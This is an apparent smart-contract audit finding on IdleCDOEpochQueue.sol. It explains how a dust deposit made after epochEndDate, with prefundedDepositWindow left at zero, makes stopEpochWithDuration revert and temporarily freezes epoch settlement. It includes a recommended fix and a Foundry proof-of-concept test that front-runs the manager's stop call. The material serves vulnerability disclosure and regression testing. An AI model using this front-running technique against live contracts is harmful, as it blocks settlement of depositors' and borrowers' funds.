### Title
Post-deadline queue deposit can deadlock prefunded epoch settlement - ([File: contracts/IdleCDOEpochQueue.sol](contracts/IdleCDOEpochQueue.sol))

### Summary
An allowed lender can submit a dust `requestDeposit` after `epochEndDate` but before `stopEpochWithDuration`, leaving an unforwardable pending deposit that forces the prefunded settlement hook to revert and temporarily prevents epoch settlement. [1](#0-0) [2](#0-1) 

### Finding Description
`IdleCDOEpochQueue.requestDeposit` treats the epoch as open whenever `isEpochRunning` is true and does not separately check `block.timestamp < epochEndDate`. [3](#0-2) [4](#0-3) 

When `prefundedDepositWindow == 0`, the prefunded cutoff check at lines 114–117 is disabled, so a post-deadline deposit can still be recorded under `epochNumber + 1`. [5](#0-4) [6](#0-5) 

The same queue cannot forward that deposit after the deadline because `processDepositsToBorrower` reverts when `prefundedDepositWindow == 0` and also requires the prefunding call to occur before `epochEndDate` when the window is nonzero. [7](#0-6) 

During `stopEpochWithDuration`, `IdleCreditVault.deposit` increments `epochNumber` while `isEpochRunning` is still true, causing the queued `epochNumber + 1` request to become the epoch inspected by the prefunded settlement hook. [8](#0-7) [9](#0-8) 

`prefundedDepositsToProcess` then reverts if raw pending deposits remain, and because this call runs inside `_afterStopEpochWithDuration`, the revert rolls back the entire epoch stop. [2](#0-1) [10](#0-9) 

The direct `stopEpoch` path is also unavailable whenever a prefunded queue is configured. [11](#0-10) 

### Impact Explanation
An attacker who passes wallet eligibility can spend one wei of underlying plus gas to repeatedly block the settlement transaction while no prefunded batch has yet been created. [12](#0-11) 

This temporarily freezes settlement of the entire active credit position, including the borrower-held principal represented by the CDO’s strategy-token balance, expected epoch interest, and pending withdrawal funding. [13](#0-12) [14](#0-13) 

The freeze is temporary rather than permanent because an honest owner or manager can disable `epochQueue`, settle the epoch, and leave the attacker’s queue-held deposit refundable through `deleteRequest`. [15](#0-14) [16](#0-15) 

### Likelihood Explanation
The attack requires the prefunded variant to have `epochQueue` configured, `prefundedDepositWindow` left at zero, and no already-prefunded amount for the target epoch. [17](#0-16) [18](#0-17) 

Those conditions are reachable because `setPrefundedDepositWindow` accepts zero and zero is also the storage default. [19](#0-18) 

The attacker only needs to be an otherwise allowed unprivileged wallet and submit between `epochEndDate` and the manager’s settlement transaction. [20](#0-19) 

If a nonzero deposit window is configured, or queued deposits have already been moved to `epochPrefundedDeposits`, the same transaction path is blocked. [21](#0-20) 

### Recommendation
Reject prefunded queue deposits once `block.timestamp >= epochEndDate`, independently of `prefundedDepositWindow`. [1](#0-0) 

Prefer also requiring a nonzero cutoff when `epochQueue` is enabled, so the zero-window configuration cannot create deposits that are impossible to forward through `processDepositsToBorrower`. [19](#0-18) [7](#0-6) 

Add a regression test that leaves the prefunded window at zero, warps past `epochEndDate`, submits a dust `requestDeposit`, and asserts that either the deposit reverts or `stopEpochWithDuration` remains executable. [10](#0-9) 

### Proof of Concept
```solidity
// test/foundry/IdleCDOEpochVariantPrefunded.t.sol
function testPostDeadlineQueueDepositBlocksPrefundedStop() external {
    address attacker = makeAddr("attacker");

    // Configure prefunded settlement but leave prefundedDepositWindow == 0.
    vm.prank(manager);
    cdoEpoch.setEpochQueue(address(queue));

    uint256 requestEpoch = strategy.epochNumber() + 1;
    uint256 interest = cdoEpoch.expectedEpochInterest();
    uint256 pendingWithdraw = strategy.pendingWithdraws();
    uint256 toRepay = interest + pendingWithdraw;
    address borrower = strategy.borrower();

    // The honest borrower has funded and approved repayment before settlement.
    deal(address(underlying), borrower, toRepay);
    vm.prank(borrower);
    underlying.approve(address(cdoEpoch), toRepay);

    // The epoch is expired, but isEpochRunning remains true until stop succeeds.
    vm.warp(cdoEpoch.epochEndDate() + 1);

    // Attacker frontruns the manager's stop transaction with a dust queue deposit.
    deal(address(underlying), attacker, 1);
    vm.startPrank(attacker);
    underlying.approve(address(queue), 1);
    queue.requestDeposit(1);
    vm.stopPrank();

    assertEq(queue.epochPendingDeposits(requestEpoch), 1);
    assertEq(queue.epochPrefundedDeposits(requestEpoch), 0);

    uint256 duration = cdoEpoch.epochDuration();
    vm.prank(manager);
    vm.expectRevert(abi.encodeWithSelector(NotAllowed.selector));
    cdoEpoch.stopEpochWithDuration(0, interest, duration, 0);

    assertTrue(cdoEpoch.isEpochRunning(), "epoch settlement was blocked");
    assertEq(strategy.epochNumber(), requestEpoch - 1, "epoch was not finalized");

    // Recovery requires the honest manager to disable the queue first.
    vm.prank(manager);
    cdoEpoch.setEpochQueue(address(0));

    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(0, interest, duration, 0);

    assertFalse(cdoEpoch.isEpochRunning(), "queue disable did not restore settlement");

    vm.prank(attacker);
    queue.deleteRequest(requestEpoch);
    assertEq(underlying.balanceOf(attacker), 1, "dust deposit was not refundable");
}
```

```text
  function _afterStopEpochWithDuration() internal override {
    address _queue = epochQueue;
    if (_queue == address(0)) return;

    IIdleCDOEpochQueuePrefunded _epochQueue = IIdleCDOEpochQueuePrefunded(_queue);
    uint256 _prefunded = _epochQueue.prefundedDepositsToProcess();
    if (_prefunded == 0) return;
    // A zero post-loss AA price cannot safely mint new shares into the same tranche token.
    _checkNotAllowed(priceAA == 0);

    // Prefunded deposits already reached the borrower, so they must join AA even if stop defaulted.
    // Mint tranche shares at the post-stop price and mirror the same amount in strategy tokens,
    // so the queue can later distribute shares to users at the epoch price.
    uint256 _prefundedMinted = _mintSharesAtCurrPrice(_prefunded, _queue, AATranche);
    IdleCreditVault(strategy).mintStrategyTokens(_prefunded);
    // Finalize the prefunded epoch in the queue by storing the epoch price and clearing state.
    _epochQueue.processPrefundedDeposits(_prefundedMinted);
```
